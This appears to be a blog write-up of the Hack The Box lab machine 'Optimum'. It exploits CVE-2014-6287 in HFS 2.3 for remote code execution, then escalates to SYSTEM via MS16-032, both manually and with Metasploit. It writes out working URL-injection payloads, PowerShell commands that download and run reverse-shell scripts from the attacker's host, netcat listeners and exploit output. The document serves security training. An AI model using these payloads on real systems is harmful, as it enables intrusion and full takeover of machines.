+++
title = "HTB - Optimum"
date = 2024-09-16
+++

<img alt="Image" async src="images/Optimum.png" width="800px"></img>

Optimum is a smooth transition from Easy to Medium on the platform. Simple concepts taken a step further.
## Manual Exploitation
### Scan
```
┌──(root㉿kali)-[/home/li0t]
└─# nmap -sV -sC --open -p- 10.10.10.8 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 09:31 EDT
Nmap scan report for 10.10.10.8
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.29 seconds

```

By the looks of our scan, seems that all we have open is port 80 hosting a HFS running version 2.3. Let's dive in.
### Enumeration
##### Port 80:

<img alt="Image" async src="images/Screenshot 2024-09-07 at 9.36.17 AM.png" width="800px"></img>

The landing page for the website has a few interactive aspects, including a login portal. I'd tried a few default credentials, but no dice. I could try and brute force using hydra or burp, but I think we should table that vector until we've got nothing else.

A bit of digging brings us to CVE-2014-6287, which allows us to use nullbytes (`%00`) to define the end of a registered search query, but not the end of our `GET /` request. Theoretically, we should be able to append our RCE to the end of our request like so:

```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.3.}
```

Notice how it's URL encoded (`^U` and `SHIFT+^U` to toggle in Burp), and it also uses `/c` to specify `$PATH` for the command we give. If I TCP dump this (`tcpdump -i tun0`), notice we get our result:

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.04.47 AM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.04.17 AM.png" width="800px"></img>

To pop a shell, let's use the Nishang. It's a huge repository on github of scripts and payloads that enable PowerShell for our needs. Once we've downloaded and installed the tool, let's take a look at our options.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.09.32 AM.png" width="800px"></img>

Let's use the Invoke TCP OneLiner. We can use `cp` to copy its contents to a file called `revtcp.ps1`, and from there, we can `vim` into the file and uncomment the command, as well as change the IP/PORT `(10.10.14.3/4321)` to match our needs. 

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.15.41 AM.png" width="800px"></img>

Once this is done, set up the listener by using the port specified, in my case, it was 4321. Don't forget the `rlwrap`!

`rlwrap nc -nlvp 4321`

Before we can throw the RCE into our header request with Burp, we need to serve this file with a SimpleHTTP server using Python. The server will host everything in the directory its spun in, so lets move our file to our `/home/` directory and spin our server there using `python -m SimpleHTTPServer 80`.

Now when we craft our request, architecture plays a very big role in completing our compromise of this system. Different paths work for different architectures, and the table below is an example. `c:\Windows\System32` and `c:\Windows\SysWow64` are both for 32-bit libraries. `c:\Windows\SysNative` is what we want here, as it's called for 64 bit libraries. I think (key word) that the session we launch is 32 bit, and in order to interact with the target machine in an efficient way, we need the 64 bit folder. SysNative meets both of those requirements.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.24.09 AM.png" width="800px"></img>

This means that our PowerShell must be called correctly if we want it to function correctly.

`/?search=%00{.+exec|c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/revtcp.ps1').}`

MAKE SURE EVERYTHING IS SQUARE. URL encoded, correct paths, listeners, etc.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.42.16 AM.png" width="800px"></img>

We should get notified on our Python server and Netcat listener as well

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.46.22 AM.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.46.43 AM.png" width="800px"></img>

Once here, we can start to get information. `ps` and `systeminfo`, as always.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 10.48.37 AM.png" width="800px"></img>

We can see x64 structure, and we can pat ourselves on the back for making our lives easier earlier. 

Not much rooting around necessary for the user flag, as we spawned in the `/Users/kostas/Desktop` directory. Simply request `more user.txt`:

`USER:09a0c26d9fe478f0f4a349d99fc8cfc4`

### Privilege Escalation

For privilege escalation, we're going to use a tool called Sherlock, which is a privilege escalation PowerShell tool that was created for Windows about 7 years ago. There's an updated version out by the same author now called Watson. I'm going to download both, but we're using Sherlock for this box given the age and parameters of the machine. `cd` to the `/opt` directory and clone the repo.

`git clone https://github.com/rasta-mouse/Sherlock.git`

Once finished, we're going to copy it into our chosen directory to edit and serve the payload. `cp` to copy to another file, and `mv` to move as I discussed above. There are plenty of function options in the script, but for now, we're going to append `function Find-AllVulns` to the end of our `.ps1` file.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 11.09.42 AM.png" width="800px"></img>

Now, to download served contents on our Python server, we can use the following script used before:

`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/dasp.ps1')` 

(I chose the name `dasp.ps1` Dunno why...)

Here is our output below:

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/dasp.ps1')


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

```

If we google MS16-032, we can find a script that allows for privilege escalation. The problem is, this requires an interactive session, and seeing as we just have a command prompt, we'll need to find (or create) a modified version. Thankfully, Empire has created a script for this specific purpose. We can download their entire framework.

`git clone https://github.com/EmpireProject/Empire.git`

Then we can `cd` to the `/opt/Empire/data/module_source/privesc` to find the `Invoke-MS16032.ps1` file. `cp` the file to the directory being served, and append the command below to the end our file.

````
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:4322/revtcp.ps1')"
````

Now, go back into your original `revtcp.ps1`, and change the port being to serve any other than the previous one. I chose `4322`. Then, use `nlwrap nc -nlvp` to set up a listener on that port.

Finally, go back to your user shell, and type the following

`IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-MS16032.ps1')`

This will serve our new privesc script and grant us a higher privilege shell in our other netcat session.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 12.08.18 PM.png" width="800px"></img>

<img alt="Image" async src="images/Screenshot 2024-09-09 at 12.10.19 PM.png" width="800px"></img>

Once here, we can `cd ../` to backtrack and find our way to the root flag.

`ROOT: af6d90a49c7471e437099290c59c3950`


## Using Metasploit
### Exploit
- MSF <img alt="Image" async src="images/Screenshot 2024-09-07 at 11.02.01 AM.png" width="800px"></img>
- user <img alt="Image" async src="images/Screenshot 2024-09-07 at 11.03.02 AM.png" width="800px"></img>
- Listing sysinfo and processes. woudl be wise to migrate
```
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User            Path
 ---   ----  ----                     ----  -------  ----            ----
 0     0     [System Process]
 4     0     System
 228   4     smss.exe
 332   324   csrss.exe
 384   480   spoolsv.exe
 388   324   wininit.exe
 396   380   csrss.exe
 424   380   winlogon.exe
 480   388   services.exe
 488   388   lsass.exe
 492   480   vmtoolsd.exe
 548   480   svchost.exe
 580   480   svchost.exe
 624   480   svchost.exe
 656   424   dwm.exe
 668   480   svchost.exe
 700   480   svchost.exe
 756   480   svchost.exe
 808   2536  SAVmeilyavIcOQj.exe      x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\radA7039.tmp\SAVmeilyavIcOQj.exe
 820   480   VGAuthService.exe
 832   480   svchost.exe
 888   480   ManagementAgentHost.exe
 952   480   svchost.exe
 1236  480   svchost.exe
 1452  480   dllhost.exe
 1580  480   msdtc.exe
 1688  548   WmiPrvSE.exe
 1896  2316  QaoYGPShfpNN.exe         x86   1        OPTIMUM\kostas  C:\Users\kostas\AppData\Local\Temp\rad98DB5.tmp\QaoYGPShfpNN.exe
 1932  1960  explorer.exe             x64   1        OPTIMUM\kostas  C:\Windows\explorer.exe
 1972  700   taskhostex.exe           x64   1        OPTIMUM\kostas  C:\Windows\System32\taskhostex.exe
 2316  2412  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
 2384  1932  vmtoolsd.exe             x64   1        OPTIMUM\kostas  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2412  1932  hfs.exe                  x86   1        OPTIMUM\kostas  C:\Users\kostas\Desktop\hfs.exe
 2500  808   cmd.exe                  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\cmd.exe
 2536  2412  wscript.exe              x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\wscript.exe
 2828  2500  conhost.exe              x64   1        OPTIMUM\kostas  C:\Windows\System32\conhost.exe
```
- migration <img alt="Image" async src="images/Screenshot 2024-09-07 at 11.05.47 AM.png" width="800px"></img>
- privesc 
```
- msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.3
lhost => 10.10.14.3
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 8888
lport => 8888
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.3:8888 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\sqKcxYUBv.ps1...
[*] Compressing script contents...
[+] Compressed size: 3757
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1136

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $rsLX = [Ntdll]::NtImpersonateThread($eFImu, $eFImu, [ref]$hB8bP)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (hB8bP:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $rsLX = [Advapi32]::DuplicateToken($qu, 2, [ref]$cL8O)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

ivOwV0dUnQMWNZ139QP29iXMKRGqsCb1
[+] Executed on target machine.
[*] Sending stage (176198 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.3:8888 -> 10.10.10.8:49177) at 2024-09-07 11:19:18 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\sqKcxYUBv.ps1

meterpreter > 
```

#easy #windows #manual #msfconsole 
